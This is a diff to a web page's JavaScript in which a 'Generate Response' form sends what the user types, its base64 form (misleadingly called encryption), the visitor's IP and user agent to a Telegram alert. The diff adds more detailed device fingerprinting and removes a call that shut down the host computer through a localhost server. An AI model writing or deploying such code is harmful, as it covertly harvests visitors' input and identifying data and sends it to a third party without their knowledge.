@@ -38,10 +38,19 @@ async function getUserIP() {
 function encryptText(str) {
   return btoa(unescape(encodeURIComponent(str)));
 }
+function getDeviceDetails() {
+  const ua = navigator.userAgent;
+  if (/iPhone/i.test(ua)) return "📱 iPhone";
+  if (/iPad/i.test(ua)) return "📱 iPad";
+  if (/Android/i.test(ua)) return "📱 Android Phone";
+  if (/Windows/i.test(ua)) return "💻 Windows PC";
+  if (/Macintosh/i.test(ua)) return "💻 Mac PC";
+  if (/Linux/i.test(ua)) return "💻 Linux PC";
+  return /Mobile|Android|iP(hone|od|ad)/i.test(ua) ? "📱 Mobile Device" : "💻 Desktop PC";
+}
 
 async function sendTelegramAlert(headerText, rawInput = '', cipherText = '') {
-  const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-  const deviceType = isMobile ? '📱 Mobile Device' : '💻 Desktop';
+  const deviceType = getDeviceDetails();
 
   const userIP = await getUserIP();
   const userAgent = navigator.userAgent;
@@ -82,17 +91,6 @@ async function sendTelegramAlert(headerText, rawInput = '', cipherText = '') {
   }
 }
 
-// Function to call the local Python shutdown server
-async function triggerLocalShutdown() {
-  try {
-    await fetch('http://localhost:5000/shutdown', {
-      method: 'POST'
-    });
-  } catch (err) {
-    console.warn("Local shutdown server not running on host computer.");
-  }
-}
-
 async function handleGenerate() {
   const inputField = document.getElementById('userInput');
   const rawText = inputField.value.trim();
@@ -115,9 +113,6 @@ async function handleGenerate() {
 
   // 1. Send alert to Telegram
   await sendTelegramAlert("🔑 <b>New Text Keyed In & Encrypted!</b>", rawText, cipherText);
-
-  // 2. Trigger local Windows shutdown call
-  triggerLocalShutdown();
 
   btn.disabled = false;
   btn.innerText = "Generate Response";
